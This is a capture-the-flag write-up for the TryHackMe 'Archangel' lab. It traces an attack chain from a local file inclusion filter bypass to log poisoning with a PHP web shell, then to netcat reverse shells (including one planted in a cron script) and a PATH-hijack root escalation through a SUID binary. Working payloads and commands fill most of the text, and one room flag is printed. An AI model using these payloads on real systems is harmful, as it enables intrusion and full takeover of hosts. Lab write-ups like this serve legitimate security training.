🧩 LFI to RCE + Root on Archangel (TryHackMe - Easy)
🔍 Local File Inclusion

The decoded base64 reveals a test.php endpoint with the following logic:

<?php
//FLAG: thm{explo1t1ng_lf1}
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
if (isset($_GET["view"])) {
    if (!containsStr($_GET['view'], '../..') &&
        containsStr($_GET['view'], '/var/www/html/development_testing')) {
        include $_GET['view'];
    } else {
        echo 'Sorry, Thats not allowed';
    }
}
?>

🧠 Vulnerability Insight:

    It blocks ../.. and requires the string /var/www/html/development_testing in the path.

    ✅ Bypass: ..//.. still resolves to ../.. in the file system but bypasses the string check.

👉 Payload:

/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//etc/passwd

📦 Impact:

    Confirmed LFI.

    Discovered archangel user via /etc/passwd.

💥 From LFI to RCE via Log Poisoning

🧪 Target: Apache access logs at /var/log/apache2/access.log.

📡 Injected malicious PHP code via Netcat:

nc mafialive.thm 80
GET /<?php system($_GET['cmd']); ?> HTTP/1.1

👁️ Validation:

    Included the log via LFI and saw PHP output executed.

🚪 Reverse Shell Payload:

/test.php?view=/var/.../access.log&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202>%261|nc%2010.2.29.238%209001%20>/tmp/f

🐚 Result: Shell as www-data.
🔐 Horizontal Privilege Escalation → archangel

📁 Interesting User-Owned Files:

find / -user archangel 2>/dev/null

🎯 Target: /opt/helloworld.sh — writable by www-data.

📅 Cronjob:

*/1 * * * * archangel /opt/helloworld.sh

🧨 Injected reverse shell into the script:

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.29.238 9002 >/tmp/f" >> /opt/helloworld.sh

🔁 Waited for the cronjob…

✅ Shell as archangel obtained.
⚙️ Root Privilege Escalation via SUID Binary

📦 Found binary: /home/archangel/myfiles/backup

    SUID bit set

    Executes cp without full path

🔍 Reverse Engineered with Ghidra:

setuid(0);
setgid(0);
system("cp /home/user/archangel/myfiles/* /opt/backupfiles");

🎯 Exploit:

    Created malicious cp:

echo "/bin/bash" > cp
chmod +x cp
export PATH=.:$PATH

💣 Execute SUID binary:

./backup

🚀 Shell as root achieved.
🏁 Summary:
Stage	Technique	Result
Initial Foothold	LFI Bypass via ..//..	File Read
RCE	Log Poisoning + PHP Injection	www-data Shell
Lateral Move	Writable Cron + Reverse Shell	Shell as archangel
Root	PATH Hijack in SUID Binary	Full Root Access

🏆 Flags Pwned:
🧩 thm{explo1t1ng_lf1}
🔐 user.txt
👑 root.txt
